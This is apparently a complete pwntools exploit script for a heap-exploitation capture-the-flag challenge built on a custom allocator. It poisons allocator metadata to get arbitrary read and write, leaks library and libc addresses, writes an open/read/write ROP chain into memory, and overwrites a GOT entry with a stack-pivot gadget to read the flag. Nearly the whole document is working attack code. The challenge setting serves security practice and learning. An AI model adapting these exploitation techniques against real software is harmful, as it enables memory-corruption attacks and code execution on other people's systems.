#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 5000 chal
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'chal')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'chall.polygl0ts.ch'
port = int(args.PORT or 9004)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
br notmalloc.c:23
c
'''.format(**locals())

def prompt(m):
    io.sendlineafter(b"> ",m)

def prompti(i):
    prompt(str(i).encode())

def create(idx,size,content):
    prompti(1)
    prompti(idx)
    prompti(size)
    if content is not None:
        prompt(content)

def show(idx):
    prompti(2)
    prompti(idx)

def delete(idx):
    prompti(3)
    prompti(idx)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RUNPATH:  b'.'


min_size = 0x20 # minimum chunk size

def padded_meta(next_=0,size=min_size,is_free=False):
    return  p64(next_) + p64(size) + p64(1 if is_free else 0) + p64(0)

## determine proper heap size
io = start()
prompt(hex(0x5000))
prompti(1)

libc_rw = int(io.recvline().split(b'-')[0],16)
libnm_rw = int(io.recvline().split(b'-')[0],16)
heap_size = libnm_rw - libc_rw # offset between libnotmalloc GOT and rw page in libc

# if locally mmap randomizes the offset between shared libraries is not constant, just brute it (very small brute)
# PS : offset is constant on remote as can be seen by the mapping leak
if args.LOCAL:
    heap_size = 0x32000
log.info(f"heap size : 0x{heap_size:x}")

io.close()
io = start()

# effective heap size is halved in libnotmalloc
# the true reason for this is to create buffer zones around the heap for easier exploitation
# as irrespective of environment as possible
prompt(hex(heap_size*2))
prompti(2)

## leak metdata_heap ptr
create(0,min_size,b"")
create(1,min_size,b"")
create(2,0x1000-min_size*3,b"")
meta_offset = heap_size - 0x1000 + min_size
#VULN : overlap of top_chunk onto the start of metadata heap
create(2,meta_offset,b"")
create(2,min_size*2 + 1,padded_meta()*2)
delete(1)
delete(0)
show(2)
io.recvline()
leak = unpack(io.recvline()[-7:-1],'all') # next pointer of chunk 0
log.info(hex(leak))
metadata_heap = leak  - min_size *2
data_heap = metadata_heap - heap_size
log.info(hex(data_heap))
log.info(hex(metadata_heap))
delete(2)

def arbr(target):
    create(2,min_size*2 + 1,padded_meta(next_=target-8))
    delete(2)
    create(0,min_size,b"")
    create(1,min_size,b"")
    show(1)
    io.recvuntil(b"size : ")
    v = int(io.recvline()[:-1])
    return v 

def arbw(target,value):
    create(2,min_size*2 + 1,padded_meta(next_=target+heap_size))
    delete(2)
    create(0,min_size,b"")
    create(1,min_size,p64(value))

## leak libnotmalloc ptr
# there's 2 ptrs at the top of the data heap
# we will poison the next pointer of chunk 0 to leak it, as the size of some other chunk
libnm = ELF('libnotmalloc.so')
libnm.address = arbr(data_heap+8) - libnm.sym.allocator_version
log.info(hex(libnm.address))

## leak libc ptr
# via libnotmalloc got
# Heap size is key to leak libc pointer
# the fake chunk corresponding to that metadata needs to fall on a rw page
create(1,min_size,b'')
delete(1)
delete(0)
libc = ELF("libc.so.6")
libc.address = arbr(libnm.got.mmap) - libc.sym.mmap64
log.info(hex(libc.address))

## put rop chain in mem
rop = ROP(libc)
rop.call('read',[0,libc.address+0x21b000,128])
rop.call('open',[libc.address+0x21b000,0,0])
rop.call('read',[3,libc.address+0x21b000,128])
rop.call('write',[1,libc.address+0x21b000,128])
rop = rop.chain()
rop_pieces = [rop[i:i+8] for i in range(0,len(rop),8)]

for i,p in enumerate(rop_pieces):
    create(1,min_size,b'')
    delete(1)
    delete(0)
    arbw(libc.address+0x21c000+i*8,u64(p))

## got overwrite
create(1,min_size,b'')
delete(1)
delete(0)
pivot = libc.address + 0x5a170 # mov rsp, rdx; ret;
arbw(libnm.got.get_mapping,pivot)

## trigger pivot + rop chain
create(0,libc.address+0x21b000,None)
io.sendline(b"flag\0")
log.info(io.recvuntil(b"}"))
io.close()
